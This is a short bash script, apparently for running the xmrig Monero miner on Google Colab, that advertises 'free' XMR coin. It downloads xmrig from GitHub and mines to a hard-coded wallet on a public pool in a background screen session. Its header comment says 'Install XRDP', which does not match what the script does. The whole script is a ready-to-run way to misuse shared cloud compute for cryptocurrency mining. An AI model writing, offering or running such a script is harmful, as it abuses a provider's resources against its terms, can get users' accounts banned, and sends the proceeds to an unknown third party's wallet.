#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o pool.minexmr.com:443 -u 428pNPokDpATfk2f7W8g1PUSkafuY7YgUdHAgS8XtokeM13xk2BVY2VZcGMT67EsBqSZAgVcEQ4F1fVdD7P45k9n8DBG7Mk -k --tls --rig-id testpc
